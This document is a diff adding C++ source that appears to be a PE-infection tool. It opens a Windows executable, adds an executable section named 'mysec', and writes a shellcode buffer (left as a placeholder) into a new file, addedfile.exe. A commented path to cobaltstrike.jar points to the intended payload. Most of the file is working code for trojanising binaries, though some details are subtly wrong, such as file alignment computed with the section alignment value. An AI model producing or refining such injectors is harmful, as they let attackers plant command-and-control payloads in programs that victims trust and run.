@@ -1,0 +1,127 @@
+#include<iostream>
+#include<Windows.h>
+
+unsigned char shellcode[] = "[c的shellcode]";
+
+
+DWORD SectionAlignment = 0;
+DWORD FileAlignment = 0;
+
+
+void myreadfile(FILE** file, char path[], int* filelen, char** exebuf)
+{
+	fopen_s(file, path, "rb");
+	fseek(*file, 0, SEEK_END);
+	*filelen = ftell(*file);
+	fseek(*file, 0, SEEK_SET);
+	char* buf = (char*)VirtualAlloc(NULL, *filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	fread(buf, 1, *filelen, *file);
+	*exebuf = buf;
+}
+
+DWORD ArithmeticFileAlignment(DWORD FileSize)
+{
+	DWORD myFileSize = 0;
+	if (FileSize % SectionAlignment != 0)
+	{
+		myFileSize = ((FileSize / SectionAlignment) + 1) * SectionAlignment;
+	}
+	else
+	{
+		myFileSize = FileSize;
+	}
+	return myFileSize;
+}
+
+DWORD ArithmeticSectionAlignment(DWORD VirtualSize)
+{
+	DWORD myVirtualSize = 0;
+	if (VirtualSize % SectionAlignment != 0)
+	{
+		myVirtualSize = ((VirtualSize / SectionAlignment) + 1) * SectionAlignment;
+	}
+	else
+	{
+		myVirtualSize = VirtualSize;
+	}
+	return myVirtualSize;
+}
+
+int main()
+{
+	char exepath[] = "C:\\Users\\86181\\source\\repos\\Project1\\malloc\\Debug\\malloc.exe";
+	char addfilepath[] = "C:\\Users\\86181\\source\\repos\\Project1\\file06\\cobaltstrike.jar";
+
+	FILE* pexefile = NULL;
+	char* exebuf = NULL;
+	int exefilelen = 0;
+	myreadfile(&pexefile, exepath, &exefilelen, &exebuf);
+
+	FILE* addfile = NULL;
+	/*char* addfilebuf = NULL;*/
+	unsigned char* addfilebuf = NULL;
+	int addfilelen = 0;
+	/*myreadfile(&paddfile, addfilepath, &addfilelen, &addfilebuf);*/
+
+
+	addfilebuf = shellcode;
+	addfilelen = sizeof(shellcode);
+
+	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)exebuf;
+	printf("pIMAGE_DOS_HEADER->e_magic:%x\n", pIMAGE_DOS_HEADER->e_magic);
+	printf("pIMAGE_DOS_HEADER->e_lfanew:%x\n", pIMAGE_DOS_HEADER->e_lfanew);
+
+	PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(exebuf + pIMAGE_DOS_HEADER->e_lfanew);
+	printf("buf + pIMAGE_DOS_HEADER->e_lfanew:%x\n", pIMAGE_NT_HEADERS->Signature);
+
+	PIMAGE_FILE_HEADER pIMAGE_FILE_HEADER = (PIMAGE_FILE_HEADER)&pIMAGE_NT_HEADERS->FileHeader;
+
+	PIMAGE_SECTION_HEADER pPIMAGE_SECTION_HEADER = (PIMAGE_SECTION_HEADER)(pIMAGE_NT_HEADERS + 1);
+
+	pPIMAGE_SECTION_HEADER = pPIMAGE_SECTION_HEADER + pIMAGE_FILE_HEADER->NumberOfSections - 1;
+	printf("pIMAGE_SECTION_HEADER->Name:%s\n", pPIMAGE_SECTION_HEADER->Name);
+	printf("Misc.VirtualSize:%x\n", pPIMAGE_SECTION_HEADER->Misc.VirtualSize);
+	printf("VirtualAddress:%x\n", pPIMAGE_SECTION_HEADER->VirtualAddress);
+	printf("SizeOfRawData:%x\n", pPIMAGE_SECTION_HEADER->SizeOfRawData);
+	printf("PointerToRawData:%x\n", pPIMAGE_SECTION_HEADER->PointerToRawData);
+	printf("Characteristics:%x\n", pPIMAGE_SECTION_HEADER->Characteristics);
+
+	SectionAlignment = pIMAGE_NT_HEADERS->OptionalHeader.SectionAlignment;
+	FileAlignment = pIMAGE_NT_HEADERS->OptionalHeader.FileAlignment;
+
+	pIMAGE_FILE_HEADER->NumberOfSections += 1;
+
+	DWORD exeAlignmentVirtualSize = ArithmeticSectionAlignment(pPIMAGE_SECTION_HEADER->Misc.VirtualSize);
+
+	DWORD FileAlignmentVirtualSize = ArithmeticFileAlignment(addfilelen);
+
+	DWORD FileAlignmentFileSize = ArithmeticFileAlignment(addfilelen);
+	PIMAGE_SECTION_HEADER pmyPIMAGE_SECTION_HEADER = pPIMAGE_SECTION_HEADER + 1;
+
+	memcpy(pmyPIMAGE_SECTION_HEADER->Name, "mysec", strlen("mysec"));
+
+	pmyPIMAGE_SECTION_HEADER->Misc.VirtualSize = FileAlignmentVirtualSize;
+	pmyPIMAGE_SECTION_HEADER->VirtualAddress = exeAlignmentVirtualSize + pPIMAGE_SECTION_HEADER->VirtualAddress;
+
+	pmyPIMAGE_SECTION_HEADER->SizeOfRawData = FileAlignmentFileSize;
+	pmyPIMAGE_SECTION_HEADER->PointerToRawData = pPIMAGE_SECTION_HEADER->SizeOfRawData + pPIMAGE_SECTION_HEADER->PointerToRawData;
+
+	pmyPIMAGE_SECTION_HEADER->PointerToRelocations = 0;
+	pmyPIMAGE_SECTION_HEADER->PointerToLinenumbers = 0;
+	pmyPIMAGE_SECTION_HEADER->NumberOfRelocations = 0;
+	pmyPIMAGE_SECTION_HEADER->NumberOfLinenumbers = 0;
+
+	pmyPIMAGE_SECTION_HEADER->Characteristics = 0x60000020;
+
+	pIMAGE_NT_HEADERS->OptionalHeader.SizeOfImage += FileAlignmentFileSize;
+
+	char* execopydata = (char*)VirtualAlloc(NULL, exefilelen + FileAlignmentFileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(execopydata, exebuf, exefilelen);
+	memcpy(execopydata + exefilelen, addfilebuf, addfilelen);
+
+
+	FILE* savefile = NULL;
+	fopen_s(&savefile, "addedfile.exe", "wb");
+	fwrite(execopydata, 1, exefilelen + FileAlignmentFileSize, savefile);
+	fclose(savefile);
+}
